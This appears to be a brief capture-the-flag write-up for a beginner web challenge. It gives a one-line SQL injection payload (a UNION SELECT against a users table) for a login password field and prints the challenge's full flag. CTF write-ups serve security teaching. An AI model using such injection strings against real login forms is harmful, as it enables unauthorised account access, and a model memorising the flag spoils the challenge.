# What's My Password?
[baby] Oh no! Skat forgot their password (again)!

# Solution
SQLi i password field
```
" UNION SELECT * FROM users WHERE username="skat
```

# Flag
<code v-if="false">`irisctf{my_p422W0RD_1S_SQl1}`</code>
<code v-else>`irisctf{my_p4*************1}`</code>

# Hashtags
#sqli #go #web